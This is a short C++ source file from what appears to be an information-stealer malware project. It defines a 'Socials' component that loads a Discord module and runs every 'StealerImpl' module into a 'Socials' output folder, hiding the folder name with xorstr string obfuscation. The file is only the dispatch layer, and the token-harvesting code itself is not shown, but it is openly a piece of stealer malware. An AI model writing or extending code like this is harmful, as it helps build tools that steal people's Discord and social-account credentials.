//
// Created by .1qxz on 07.06.2024.
//

#include "Socials.h"
#include "impl/Discord.h"
#include <thread>

Socials::Socials()
{
    this->modules.push_back(new Discord());
}

void Socials::execute(fs::path &root) {
    fs::path socials_path = root / xorstr_("Socials");
    for (StealerImpl* module : this->modules) {
        module->execute(socials_path);
    }
}
